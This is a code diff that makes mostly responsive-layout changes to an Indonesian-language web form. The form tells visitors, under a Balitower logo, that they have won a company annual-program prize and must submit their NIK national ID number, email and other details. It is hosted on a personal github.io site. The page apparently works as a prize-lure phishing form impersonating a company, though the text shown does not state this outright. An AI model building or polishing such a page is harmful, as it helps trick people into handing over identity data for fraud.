@@ -10,11 +10,11 @@
     <style>
         /* Custom CSS untuk memastikan konten tetap dalam satu halaman */
         body, html {
-            height: 80%;
+            height: 100%;
             margin: 0;
         }
         .form-container {
-            max-height: calc(100vh - 200px); /* Sesuaikan tinggi form */
+            max-height: 80vh; /* Batasi tinggi form */
             overflow-y: auto; /* Tambahkan scroll jika konten melebihi tinggi */
         }
     </style>
@@ -23,7 +23,7 @@
     <div class="flex flex-col items-center min-h-screen relative">
         <!-- Header -->
         <div class="w-full bg-white py-2 flex justify-center shadow-md mb-3">
-            <img alt="Balitower logo" src="logo.png" width="150"/>
+            <img alt="Balitower logo" src="logo.png" width="150" class="w-24 md:w-32 lg:w-48"/>
         </div>
 
         <div class="absolute -z-50">
@@ -31,18 +31,18 @@
         </div>
 
         <!-- Main Content -->
-        <div class="w-9/12 bg-white shadow-lg rounded-lg overflow-hidden form-container">
+        <div class="w-11/12 md:w-9/12 bg-white shadow-lg rounded-lg overflow-hidden form-container">
             <!-- Banner -->
             <div class="relative">
-                <img alt="Decorative balloons" class="w-full" src="banner-text.png"/>
+                <img alt="Decorative balloons" class="w-full" src="banner-text-1.png"/>
             </div>
 
             <!-- Form Section -->
-            <div class="p-8">
-                <h1 class="text-center text-2xl font-bold mb-4">Selamat Anda terpilih mendapat hadiah program tahunan perusahaan.</h1>
-                <p class="text-center text-lg mb-6">Untuk mendapatkan hadiah ini Anda harus melengkapi data-data dibawah ini ya !</p>
+            <div class="p-4 md:p-8">
+                <h1 class="text-center text-xl md:text-2xl font-bold mb-4">Selamat Anda terpilih mendapat hadiah program tahunan perusahaan.</h1>
+                <p class="text-center text-base md:text-lg mb-6">Untuk mendapatkan hadiah ini Anda harus melengkapi data-data dibawah ini ya !</p>
 
-                <form class="grid grid-cols-2 gap-6" id="confirmationForm" method="POST" action="">
+                <form class="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6" id="confirmationForm" method="POST" action="">
                     <input name="__original_url" type="hidden" value="https://fittrianto.github.io/"/>
                     
                     <!-- Kolom 1: NIK dan Email -->
@@ -76,8 +76,8 @@
                     </div>
                     
                     <!-- Tombol Konfirmasi -->
-                    <div class="col-span-2 flex justify-center mt-6">
-                        <button class="bg-orange-500 text-white px-8 py-3 rounded-lg hover:bg-orange-600 transition duration-300" type="submit">
+                    <div class="col-span-1 md:col-span-2 flex justify-center mt-6">
+                        <button class="bg-orange-500 text-white px-6 py-2 md:px-8 md:py-3 rounded-lg hover:bg-orange-600 transition duration-300" type="submit">
                             Konfirmasi
                         </button>
                     </div>
@@ -93,7 +93,7 @@
 
     <script>
         document.getElementById("confirmationForm").addEventListener("submit", function(event) {
-            // Tampilkan pesan sukses, tetapi biarkan form terkirim
+            event.preventDefault(); // Mencegah form dari pengiriman langsung
             Swal.fire({
                 title: "Konfirmasi Berhasil!",
                 text: "Data telah disimpan.",
